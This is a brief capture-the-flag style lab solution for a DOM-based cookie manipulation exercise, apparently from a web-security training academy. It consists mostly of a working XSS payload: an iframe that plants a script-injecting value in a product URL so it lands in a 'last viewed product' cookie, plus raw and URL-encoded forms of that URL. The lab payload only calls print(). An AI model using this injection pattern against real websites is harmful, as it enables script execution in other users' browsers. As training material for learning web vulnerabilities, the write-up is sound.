Lab #5 – DOM-based cookie manipulation

Target Goal - Inject a malicious cookie in the application that exploits an XSS vulnerability and calls the print() function.

Analysis:


<a href='https://0a22008004f2fc9a82bf8ab6002b00f3.web-security-academy.net/product?productId=1'>Last viewed product</a>

<iframe src="https://0a22008004f2fc9a82bf8ab6002b00f3.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="this.src='https://0a22008004f2fc9a82bf8ab6002b00f3.web-security-academy.net/'">

https://0a22008004f2fc9a82bf8ab6002b00f3.web-security-academy.net/product?productId=1&'><script>print()</script>

https://0a22008004f2fc9a82bf8ab6002b00f3.web-security-academy.net/product?productId=1&%27%3E%3Cscript%3Eprint()%3C/script%3E